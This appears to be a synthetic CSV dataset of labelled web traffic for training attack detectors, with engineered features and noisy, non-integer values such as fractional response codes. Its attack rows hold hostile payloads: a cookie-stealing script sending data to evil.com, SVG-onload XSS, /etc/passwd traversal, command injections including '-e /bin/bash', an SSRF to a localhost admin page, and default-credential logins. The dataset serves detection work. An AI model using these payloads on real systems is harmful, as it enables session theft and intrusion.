timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-01 06:34:50,192.168.1.78,3.12.45.78,http,post,/comment,"{""Host"":""172.67.128.45"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",comment=%3Cscript%3Efetch%28%27https%3A//evil.com/steal%3Fcookie%3D%27%2Bdocument.cookie%29%3C/script%3E,413.67168860524083,4412.502287050948,,Mozilla/5.0 (Unknown; Unknown) Unknown,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,xss,5.53792332463133,5.672878513047839,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Unknown; Unknown) Unknown,*/*,text/html,Apache,8.311773887854644,0.03588670618559916,1.6586045901694222,0,0,0,0,0,0,0,0,84.42284439478729,103.60889245547487,5.984797432451223,0.005099894928914397,0.9860255228488597,0,0,0,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>comment=%3Cscript%3Efetch%28%27https%3A//evil.com/steal%3Fcookie%3D%27%2Bdocument.cookie%29%3C/script%3E,4xx,1,0,0,50.27940918783631,0,1,52.26668585598378,15.381398189467582,0.38119829531686916,0,953.3093999906333,546.5973376622865,1,0,0,17.22948010240771,Apache,-0.005703210925371395,0.4900809091913109,0.0,0.0,0.0,0.0,0.0,0.19954881022365317,-0.0009669039587125843,0,0,0,0.9798180185508985,0,2026-03-01 06:34:00,1,0.27264843361115604
2026-03-01 06:36:40,172.67.128.115,34.120.45.67,https,get,/login,"{""Host"":""3.12.45.78"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,192.11697872605976,1836.4774218865423,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),,normal,10.566652276487437,6.143272799997558,1,0,"{'Host': '3.12.45.78', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,nginx,3.0562034042346187,-0.019557220278961965,0.8886987601161263,0,0,0,0,0,0,0,0,0.9980409834005011,0.0,0.13606023313036958,-0.005745739949904209,-0.02312743125770687,0,1,0,,2xx,0,1,0,-34.493954544648275,0,1,1840.082173408692,2.105017251050453,0.30412999032649585,0,1013.9004910994869,589.7151212357244,0,0,1,11.493507235549028,nginx,0.004112207460801771,-0.010205782362970808,0.0,0.0,0.0,0.0,0.0,0.2907852137343875,0.0014841940856447906,0,0,0,1.0227485109784755,0,2026-03-01 10:23:00,1,0.6639766820984414
2026-03-01 06:38:18,192.168.1.178,198.51.100.23,https,get,/about?tag=<html>,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,215.60789887618756,3500.2542349778705,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,normal,4.664554759980762,5.841201557793981,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,14.103989782625526,1.0339471259739255,5.296319436759689,0,0,0,0,0,0,0,0,1.7836114425925782,0.0,0.05342560431507446,0.033760205713002464,0.03555024977568957,0,1,0,,2xx,0,1,0,-10.984874268879636,0,1,1962.453341233367,9.966596859395406,0.30113502536333975,0,1053.9813506858525,653.5610443822517,0,0,1,67.774238926972,Apache,-0.0013526821670988359,-0.00925662179685933,0.0,0.0,0.0,0.0,0.0,0.3755192338046174,0.05777739374509351,0,0,0,0.9569107043380354,0,2026-03-01 06:38:00,1,0.301182710390849
2026-03-01 06:40:34,172.16.0.6,104.18.24.12,https,get,/download?file=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""185.199.108.153"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,398.3304435060314,3202.1232389039756,"{""Content-Type"":""text/html"",""Server"":""nginx""}",wget/1.21.2,%2e%2e%2fetc/passwd,directory_traversal,6.02767728996011,5.8954628104987545,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,wget/1.21.2,*/*,text/html,nginx,53.88888289986896,0.9898665749187217,4.5980855222382075,0,0,0,1,0,0,0,0,55.86505350355101,0.0,-0.1254384855501713,-0.04635468767132713,0.03867629499778581,1,0,0,%2e%2e%2fetc/passwd,4xx,1,0,0,192.09296859777095,0,1,57.318896843094144,8.994309685952,0.539321231711832,0,984.9417756077416,616.6733554912108,1,0,0,10.3893155177221,nginx,0.02972519723191646,0.0358824920779947,0.0,1.0,0.0,0.0,0.0,0.0853253078335641,0.02070068853066273,0,0,0,0.9845671439663651,1,2026-03-01 06:40:00,1,0.5379411197661017
2026-03-01 06:40:47,172.67.128.80,34.120.45.67,http,get,/traceroute?host=| ping -n 10 127.0.0.1,"{""Host"":""172.67.128.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,393.41534250027775,2224.077248938613,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,| ping -n 10 127.0.0.1,command_injection,4.803842224583369,5.77443749888396,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,36.50438052776384,1.002426879703445,7.147029214353214,1,0,0,1,0,0,1,0,70.42048940022909,1.47165877136816,0.0,-0.01794853967236643,-0.07571275355778159,0,0,0,| ping -n 10 127.0.0.1,4xx,1,0,0,91.99077044233579,0,1,31.58281443200788,3.850768961330136,0.4961140472621621,0,1009.6502482585674,590.8560962359068,1,0,0,30.268593600257645,Apache,-0.034880320443310076,0.0292104421509573,1.0,0.0,1.0,0.0,0.0,0.19578552247770525,0.024761696817176954,0,0,0,0.9068048849993716,0,2026-03-01 06:40:00,1,0.4839872762744799
2026-03-01 06:43:08,10.0.0.7,203.0.113.45,https,get,/proxy?target=http://localhost:8080/admin,,,378.026326138665,2706.7876890676457,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,http://localhost:8080/admin,ssrf,6.28317014255166,6.1819173020287845,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,IIS,44.65327571239434,0.9990702817217021,5.859740092567358,0,0,0,0,1,0,0,0,102.52262693049991,0.0,-0.07851892720204154,0.017774239788652696,-0.07618968110117284,0,0,0,http://localhost:8080/admin,4xx,1,0,0,87.1277007662356,0,1,26.40185654726324,12.255055600433645,0.27550149008807134,0,1024.704993206481,613.6681752093034,1,0,0,10.824992689665132,IIS,0.03635545304353726,0.01821605021843666,0.0,0.0,1.0,0.0,0.0,0.13122755271772546,0.024557481945372266,0,0,0,1.1019225176450682,0,2026-03-01 06:43:00,1,0.1541824200339057
2026-03-01 06:43:40,192.168.1.14,203.0.113.45,http,get,"/search?q=prompt('enter your password:', 'password')","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403.7555843780136,5204.961374934411,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","prompt('enter your password:', 'password')",xss,6.297739786809478,6.157145079331046,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,56.2229283991932,0.9843725618723808,2.8859771653147175,0,1,0,0,0,0,0,0,80.11620514574932,0.0,3.8759789970562046,0.03426211540419435,0.9369347114443572,0,0,0,"prompt('enter your password:', 'password')",4xx,1,0,0,110.94768051166194,0,1,64.96764749984627,13.677912756649167,0.5851800263642734,0,1024.0399348385351,610.8226840290133,0,1,0,96.87340187890459,nginx,-0.04745070775385585,1.005552695079057,0.0,0.0,0.0,0.0,0.0,0.05133096491921846,0.016207665522375105,0,0,0,1.0290870974269908,0,2026-03-01 06:43:00,1,0.32653890415036835
2026-03-01 06:43:57,203.0.113.204,10.0.0.1,http,get,/traceroute?host=; sleep 10,"{""Host"":""198.51.100.23"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,409.3097485046496,6878.51766722077,"{""Content-Type"":""text/html"",""Server"":""IIS""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",; sleep 10,command_injection,5.837433059058378,5.85007991060877,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,IIS,28.75147313539958,1.0104580199316777,3.3008324185869835,1,0,1,0,0,0,0,0,30.07211467199835,0.0,1.1228326147441028,0.9539589289772701,0.025497315127898795,0,0,0,; sleep 10,4xx,1,0,0,721.6723157568622,0,1,228.7340861208441,2.039311418888669,0.9976098519154987,1,989.9707716216514,578.6584801627563,1,0,0,12.645961818078469,IIS,0.9973628948902932,0.032562476939670335,1.0,0.0,0.0,0.0,0.0,0.11480567980090421,0.03975718323552839,0,0,0,1.0947572663905214,0,2026-03-01 06:43:00,1,0.987269356201842
2026-03-01 06:45:32,192.168.1.37,34.120.45.67,https,post,/products?sort=books,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,199.60971928348886,1604.1119185973228,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,normal,6.302220873031022,5.705406456317894,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),*/*,text/html,Apache,23.9504058237424,1.0021655198591093,3.0964585495741432,0,0,0,0,0,0,0,0,0.0,21.753506718377725,0.12311762645418581,0.04647291162783348,0.03370061725752224,0,1,0,comment=Great article!,2xx,0,1,0,-0.6688525857141968,0,0,1604.1119185973228,11.216249789133473,0.4717419262990587,0,1008.5553306711802,585.8000149361649,0,1,0,78.58821887838427,Apache,-0.0558926623012507,0.00628598225260857,0.0,0.0,0.0,0.0,0.0,0.12928626647756328,0.04919626288327745,0,0,0,0.9207423311697961,0,2026-03-01 06:45:00,1,0.38529708711457444
2026-03-01 06:48:12,192.168.1.45,198.51.100.23,http,post,/comment,"{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",comment=%3Csvg%20onload%3Dalert%28document.cookie%29%3E,400.72384723062396,2309.165771455469,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",<svg onload=alert(document.cookie)>,xss,6.304393451608927,5.80028087929175,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,IIS,4.350193576022537,-0.037386928845556514,0.8478265192707062,0,0,0,0,0,0,0,0,39.90524187027979,53.562848601245435,1.9869149760374907,-0.003333766441734853,1.962275599041348,0,0,0,<svg onload=alert(document.cookie)>comment=%3Csvg%20onload%3Dalert%28document.cookie%29%3E,4xx,1,0,0,77.461394828641,0,1,57.86622667172118,9.790340507711587,0.5290672563265633,0,1057.4675216514518,657.6428340474406,1,0,0,17.490163297082024,IIS,-0.04452429891556292,0.4755617397532195,0.0,0.0,0.0,0.0,0.0,0.19489397528049537,4.07341129969116e-05,0,0,0,1.0209913352690003,0,2026-03-01 06:48:00,1,0.5049516283815478
2026-03-01 06:54:15,192.168.1.13,203.0.113.45,http,post,/login,,,387.78997072298324,499.8420964162058,"{""Content-Type"":""text/html"",""Server"":""IIS""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",username=admin&password=password,credential_stuffing_brute_force,6.145553283437177,6.008940087679898,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",34.120.45.67,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,IIS,5.881952025254125,-0.044141851578800614,0.6419562964696219,0,0,0,0,0,0,0,1,39.38508807616659,31.824573774215285,1.0873213939358672,-0.05132272424215587,0.05043666218366997,0,0,0,username=admin&password=passwordusername=admin&password=password,4xx,1,0,0,-1.4747727593221853,0,1,12.691150910963158,15.800255593334596,0.663149616347451,0,1032.9149303635454,611.2035703232916,0,1,0,83.5369865336286,IIS,-0.007379694883923448,0.023245490320029503,0.0,0.0,0.0,0.0,1.0,0.1091400089142833,-0.004654243542433757,0,0,0,1.0078983632264058,0,2026-03-01 06:54:00,1,0.44732658399350034
2026-03-01 06:59:30,185.199.108.87,172.67.128.45,https,post,/comment,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=%3Csvg%20onload%3Dalert%28document.cookie%29%3E,498.44387137161334,7174.140917333711,"{""Content-Type"":""text/html"",""Server"":""IIS""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",<svg onload=alert(document.cookie)>,xss,5.32213977268861,5.5569862841596365,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,IIS,8.866097321884306,-0.009371689457486189,0.7745148039314046,0,0,0,0,0,0,0,0,40.63671166452421,54.83334992249432,1.7744556891718541,0.018696590229601743,2.0798033822848723,0,0,0,<svg onload=alert(document.cookie)>comment=%3Csvg%20onload%3Dalert%28document.cookie%29%3E,5xx,1,0,0,212.49995633141575,0,1,176.54334279209715,2.9559456651480556,0.629384997432849,0,1022.7056725518971,626.7614335386081,0,1,0,80.15986434722414,IIS,0.0023631312893399154,0.5096022344269966,0.0,0.0,0.0,0.0,0.0,0.08735690302199361,-0.0033706958526543603,0,0,0,1.023296889691719,0,2026-03-01 06:59:00,1,0.6575808575907222
2026-03-01 07:01:03,10.0.0.141,3.12.45.78,http,get,https://facebook.org/login,"{""Host"":""10.0.0.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,502.1504184048623,2612.36245179467,"{""Content-Type"":""text/html"",""Server"":""IIS""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",facebook.org,typosquatting_url_spoofing,7.902949209266248,5.880364837501773,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,IIS,28.558494865221494,0.022599847596218876,3.6578567417628207,0,0,0,0,0,0,0,0,42.17683686922585,2.2455008409977717,0.08963575209309033,0.017529727994390294,-0.021563462028485567,0,0,0,facebook.org,5xx,1,0,0,252.47007937469368,0,1,61.93832078717997,10.137580624009953,0.47355231435911876,0,948.4700234738503,547.6813837625489,1,0,0,11.505875667142387,IIS,0.014216607104508502,0.011254408225454928,0.0,0.0,0.0,0.0,0.0,0.1280829665227685,0.001153041536235711,0,0,0,1.0436535653405108,0,2026-03-01 07:01:00,1,0.41875358030447946
2026-03-01 07:05:18,192.168.1.20,192.168.1.1,http,get,https://google.net/login?redirect=/dashboard,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,384.9960631408376,326.1557802394369,"{""Content-Type"":""text/html"",""Server"":""IIS""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",google.net,typosquatting_url_spoofing,7.179484176923491,5.8671262680016465,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,IIS,47.41128351471333,1.0676815582098496,7.478424035620629,0,0,0,0,0,0,0,0,68.98894802994894,0.0,-0.048143123996177546,0.02159259377903606,-0.012069552388121069,0,0,0,google.net,4xx,1,0,0,34.13984397505204,0,1,4.727652610355049,8.749085760004244,0.8338761114192311,0,990.6734354706946,618.1005766853543,0,1,0,79.5772217088963,IIS,0.048866033942868585,-0.0023220109896556216,0.0,0.0,0.0,0.0,0.0,0.15773511032030635,0.02373806621809044,0,0,0,1.0904801849775425,0,2026-03-01 07:05:00,1,0.7681148277837164
2026-03-01 07:05:47,192.168.1.215,192.168.1.1,https,post,/products,"{""Host"":""203.0.113.45"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,181.10271250255983,5010.199444645141,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,8.925613454493815,5.880285377733704,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",203.0.113.45,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Cloudflare,5.033546746317938,0.012684399590054579,0.6240081532296003,0,0,0,0,0,0,0,0,0.0,36.0347513125612,-0.11054070734291838,-0.024779100980363313,-0.016981248358214223,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,-4.913820938674715,0,0,5010.199444645141,9.863586355994702,0.7346872847953478,0,995.1394450710632,618.5349363615438,0,0,1,12.12493273845605,Cloudflare,0.03628556652667662,0.02119490454506103,0.0,0.0,0.0,0.0,0.0,0.12396987346666942,-0.0013166805718076912,0,0,0,0.902796248386116,0,2026-03-01 09:53:00,1,0.4172249507179887
2026-03-01 07:13:22,198.51.100.171,192.168.1.1,https,get,/download?file=c:\windows\system32\drivers\etc\hosts,"{""Host"":""203.0.113.45"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,197.78725337211708,6282.658947991674,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",c:\windows\system32\drivers\etc\hosts,directory_traversal,7.206608519431049,5.942965787357447,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,51.01307199003996,1.0329867547046294,2.9236918066497344,0,0,0,0,0,0,0,0,68.62314846162717,0.0,0.046350806263035775,-0.028810685309105046,0.028249140630380604,0,0,0,c:\windows\system32\drivers\etc\hosts,2xx,0,1,0,161.29345154381227,0,1,91.5530559123912,3.1588931568578147,0.9980678134312451,1,992.6725624850379,620.392839740914,1,0,0,6.0987203963328955,nginx,-0.03694149057918914,0.030687190807431326,0.0,0.0,0.0,0.0,0.0,0.05731260033154973,0.021925277453502378,0,0,0,1.0507420613787861,1,2026-03-01 07:13:00,1,0.6647739061834169
2026-03-01 07:15:00,185.199.108.8,172.67.128.45,https,get,/ping?ip=127.0.0.1-e /bin/bash,"{""Host"":""104.18.24.12"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,398.48546621032034,1193.7655896776441,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",-e /bin/bash,command_injection,7.554671804492663,6.024111318390972,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,26.432041000164944,1.0493689610817853,8.817501258555321,0,0,0,0,1,0,1,0,100.10649484870204,1.1749720797722867,-0.10442102370181203,0.016335307670119575,0.017471193322513744,0,0,0,-e /bin/bash,4xx,1,0,0,91.96218479245994,0,1,11.924956432465903,3.782323652562245,0.5233012125468101,0,1018.5279709458994,628.2126354746345,1,0,0,22.109977631519392,nginx,-0.002327109265176954,0.010513475568059592,0.0,0.0,1.0,0.0,0.0,0.3335913885159416,0.03566162753280869,0,0,0,0.9998028246080288,0,2026-03-01 07:15:00,1,0.5155928736898677
